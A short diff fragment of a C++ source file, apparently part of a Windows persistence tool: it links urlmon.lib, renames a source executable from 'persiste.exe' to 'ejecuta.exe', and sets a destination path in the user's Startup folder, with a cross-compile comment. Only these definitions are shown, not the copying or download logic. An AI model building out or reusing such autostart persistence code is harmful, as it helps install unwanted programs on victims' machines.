@@ -5,7 +5,7 @@
 		#pragma comment(lib, "urlmon.lib")
 		#include <lmcons.h>
 		#include <cstring>
-		#define ORIGENARCHIVO "persiste.exe"
+		#define ORIGENARCHIVO "ejecuta.exe"
 		#define DESTINOPATH "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
 		using namespace std;
 		//compilar: i686-w64-mingw32-g++ persiste.cpp -o persiste -static-libgcc -static-libstdc++
